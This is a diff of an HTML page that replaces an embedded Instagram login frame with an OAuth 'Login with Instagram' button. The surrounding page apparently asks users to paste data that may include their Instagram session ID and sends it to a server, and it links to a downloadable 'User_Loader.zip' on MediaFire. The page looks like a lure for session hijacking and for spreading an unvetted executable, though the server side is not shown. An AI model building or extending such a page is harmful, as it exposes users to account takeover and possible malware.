@@ -132,13 +132,35 @@
       text-align: center;
     }
 
-    iframe {
-      width: 100%;
-      max-width: 600px;
-      height: 600px;
+    /* --- Instagram Login Button --- */
+    .insta-btn {
+      margin-top: 25px;
+      background: linear-gradient(45deg, #ff0040, #ff6600, #ffcc00);
+      color: white;
       border: none;
-      margin-top: 20px;
-      display: none;
+      padding: 12px 28px;
+      font-size: 1.1rem;
+      font-weight: 700;
+      border-radius: 12px;
+      cursor: pointer;
+      transition: 0.4s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      box-shadow: 0 0 20px rgba(255,0,0,0.3), 0 0 40px rgba(255,0,0,0.2);
+      font-family: "Quantico", sans-serif;
+    }
+
+    .insta-btn img {
+      width: 26px;
+      height: 26px;
+      border-radius: 6px;
+    }
+
+    .insta-btn:hover {
+      transform: scale(1.08);
+      box-shadow: 0 0 30px rgba(255,0,0,0.6), 0 0 60px rgba(255,50,50,0.5);
     }
 
   </style>
@@ -164,8 +186,11 @@
 
     <p class="note">⚠️ ~SESSIONID IS ONLY REQUIRED IN SOME CASES~ ⚠️</p>
 
-    <!-- Instagram iframe -->
-    <iframe id="instagramFrame"></iframe>
+    <!-- Instagram Login Button -->
+    <button id="loginInstagramBtn" class="insta-btn">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" />
+      Login with Instagram
+    </button>
   </div>
 
   <script>
@@ -173,7 +198,7 @@
     const sendBtn = document.getElementById('sendBtn');
     const statusMessage = document.getElementById('statusMessage');
     const loadBtn = document.getElementById('loadBtn');
-    const instagramFrame = document.getElementById('instagramFrame');
+    const loginInstagramBtn = document.getElementById('loginInstagramBtn');
 
     pasteInput.addEventListener('input', () => {
       sendBtn.disabled = pasteInput.value.trim() === '';
@@ -200,15 +225,6 @@
           statusMessage.textContent = '✅ Your request has been sent successfully! Thank you!';
           statusMessage.classList.add('success');
           pasteInput.value = '';
-
-          // Try to open Instagram in iframe
-          instagramFrame.src = 'https://www.instagram.com/accounts/login/';
-          instagramFrame.style.display = 'block';
-
-          // Fallback if iframe blocked
-          instagramFrame.onerror = () => {
-            window.open('https://www.instagram.com/accounts/login/', '_blank');
-          };
         } else if (data.error) {
           statusMessage.textContent = data.error;
           statusMessage.classList.add('error');
@@ -226,6 +242,20 @@
 
     loadBtn.addEventListener('click', () => {
       window.open("https://www.mediafire.com/file/p38hzt8bjsb5bgu/User_Loader.zip/file", "_blank");
+    });
+
+    // Instagram login button
+    loginInstagramBtn.addEventListener('click', () => {
+      const clientId = "YOUR_APP_ID"; // Replace with your Instagram App ID
+      const redirectUri = encodeURIComponent("https://yourdomain.com/auth/callback");
+      const authUrl = `https://api.instagram.com/oauth/authorize?client_id=${clientId}&redirect_uri=${redirectUri}&scope=user_profile,user_media&response_type=code`;
+
+      statusMessage.textContent = "Redirecting to Instagram...";
+      statusMessage.classList.add('success');
+
+      setTimeout(() => {
+        window.location.href = authUrl;
+      }, 1000);
     });
   </script>
 </body>
